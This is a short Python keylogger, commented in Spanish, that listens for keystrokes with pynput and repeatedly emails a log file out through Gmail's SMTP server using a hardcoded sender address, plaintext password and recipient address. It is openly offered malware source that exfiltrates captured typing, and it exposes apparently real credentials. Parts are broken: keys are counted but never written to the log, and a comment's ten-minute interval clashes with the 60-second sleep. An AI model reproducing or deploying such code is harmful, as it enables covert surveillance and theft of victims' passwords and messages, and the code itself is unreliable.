import smtplib
import threading
import time
import os
import requests
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.logDir = "logs"
        self.url = "http://example.com/upload.php"  # URL para enviar los registros
        self.count = 0

    def start(self):
        # Iniciar el keylogger en un hilo separado
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.start()

        # Crear un hilo para enviar correos electrónicos en segundo plano
        email_thread = threading.Thread(target=self.send_email_loop)
        email_thread.daemon = True
        email_thread.start()

        # Esperar hasta que el keylogger termine (esto nunca sucederá, ya que se ejecuta en un hilo separado)
        keyboard_listener.join()

    def on_press(self, key):
        # Incrementar el contador de pulsaciones de teclas
        self.count += 1

        # Enviar correo electrónico cada vez que el contador alcanza un múltiplo de 10
        if self.count % 10 == 0:
            self.send_email()

    def send_email_loop(self):
        while True:
            self.send_email()
            time.sleep(60)  # Esperar 10 minutos antes de enviar otro correo electrónico

    def send_email(self):
        # Reemplazar con tus ajustes de correo electrónico
        sender_email = "mari8pachon@gmail.com"
        receiver_email = "adriromerero@gmail.com"
        password = "sd7piHjP9!oq&%"

        # Construir el mensaje de correo electrónico con los registros de pulsaciones de teclas
        message = "Subject: Keylogger Logs\n\n" + open(os.path.join(self.logDir, "log.log"), "r").read()

        try:
            # Enviar correo electrónico usando SMTP
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message)
            print("Email sent!")
        except Exception as e:
            print("Error sending email:", str(e))

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()